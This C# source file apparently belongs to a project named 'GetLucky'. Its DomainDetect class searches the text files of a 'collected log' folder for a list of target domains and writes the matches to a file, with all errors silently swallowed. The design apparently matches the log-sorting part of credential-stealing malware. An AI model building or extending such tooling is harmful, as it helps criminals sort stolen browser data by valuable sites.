using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using GetLucky.Properties;

namespace GetLucky
{
    public class DomainDetect
    {

        public static void GetDomainDetect(string Browser)
        {
            try
            {

                Encoding enc = Encoding.UTF8;
                var for_search = Resources.Domains.Split().Select(w => w.Trim()).Where(w => w != "").Select(w => w.ToLower()).ToList();
                // Во всех подпапках сборанного лога в *.txt ищем нужные домены
                var di = new DirectoryInfo(Browser);
                var files = di.GetFiles("*.txt", SearchOption.AllDirectories);
                var lines_input = new List<string>();
                foreach (var fl in files)
                {
                    lines_input.AddRange(File.ReadAllLines(fl.FullName, enc));
                }

                HashSet<string> all_words = new HashSet<string>();


                foreach (var line in lines_input)
                {
                    var from_line = line.Split().Select(w => w.Trim()).Where(w => w != "").Select(w => w.ToLower()).ToList();
                    foreach (var fl in from_line)
                    {
                        if (!all_words.Contains(fl))
                            all_words.Add(fl);
                    }
                }

                HashSet<string> found = new HashSet<string>();

                foreach (var fs in for_search)
                {
                    foreach (var h in all_words)
                    {
                        if (h.Contains(fs))
                        {
                            if (!found.Contains(fs))
                                found.Add(fs);
                        }
                    }
                }
                File.WriteAllLines(Browser + "\\DomainDetect.txt", found, Encoding.Default);
                string result = string.Join(", ", found);


            }
            catch
            {

            }
        }
    }
}
